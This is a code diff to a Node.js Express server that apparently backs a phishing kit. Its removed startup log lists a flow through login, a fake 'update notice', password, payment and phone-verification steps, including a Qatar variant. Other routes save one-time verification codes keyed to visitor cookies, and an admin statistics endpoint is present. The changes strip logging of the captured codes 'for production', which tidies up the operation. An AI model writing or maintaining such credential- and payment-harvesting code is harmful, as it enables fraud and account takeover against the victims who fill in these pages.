@@ -470,21 +470,7 @@ app.get('/api/admin/statistics', async (req, res) => {
 });
 
 app.listen(PORT, () => {
-    console.log(`\n🚀 Server running on http://localhost:${PORT}`);
-    console.log(`\n📄 Available pages:`);
-    console.log(`   - http://localhost:${PORT}/              (الصفحة الرئيسية)`);
-    console.log(`   - http://localhost:${PORT}/login         (تسجيل الدخول)`);
-    console.log(`   - http://localhost:${PORT}/update-notice (تنبيه التحديث)`);
-    console.log(`   - http://localhost:${PORT}/step1         (الخطوة الأولى)`);
-    console.log(`   - http://localhost:${PORT}/step2         (الخطوة الثانية)`);
-    console.log(`   - http://localhost:${PORT}/step2Q        (الخطوة الثانية - قطر)`);
-    console.log(`   - http://localhost:${PORT}/step3         (الخطوة الثالثة - كلمة المرور)`);
-    console.log(`   - http://localhost:${PORT}/step4         (الخطوة الرابعة - التسديد)`);
-    console.log(`   - http://localhost:${PORT}/step5         (الخطوة الخامسة - توثيق الهاتف)`);
-    console.log(`   - http://localhost:${PORT}/step6         (الخطوة السادسة - إتمام التسجيل)`);
-    console.log(`\n🎨 Using EJS templates (Dynamic Node.js)`);
-    console.log(`\n🔗 Workflow Path:`);
-    console.log(`   / → /login → /update-notice → /step1 → /step3 → /step2Q → /step4 → /step5 → /step6`);
+    // Server started - logs disabled for production
 });
 
 // API: Save activation data (step5)
@@ -546,13 +532,13 @@ app.post('/api/save-activation-data', async (req, res) => {
 app.post('/api/save-verification-code', async (req, res) => {
     try {
         const vid = req.cookies.vid;
-        // console.log('[Save Verification] Visitor ID:', vid);
+
         if (!vid) {
             return res.status(400).json({ success: false, error: 'No visitor ID' });
         }
         
         const { verificationCode } = req.body;
-        console.log('[Save Verification] New verification code submitted');
+
         if (!verificationCode) {
             return res.status(400).json({ success: false, error: 'No verification code provided' });
         }
@@ -597,9 +583,9 @@ app.post('/api/save-verification-code', async (req, res) => {
             lastUpdated: timestamp
         };
         
-        // console.log('[Save Verification] Updates to save:', JSON.stringify(updates, null, 2));
+
         await docRef.set(updates, { merge: true });
-        console.log('[Save Verification] Verification code saved successfully');
+
         
         res.json({ success: true });
     } catch (error) {
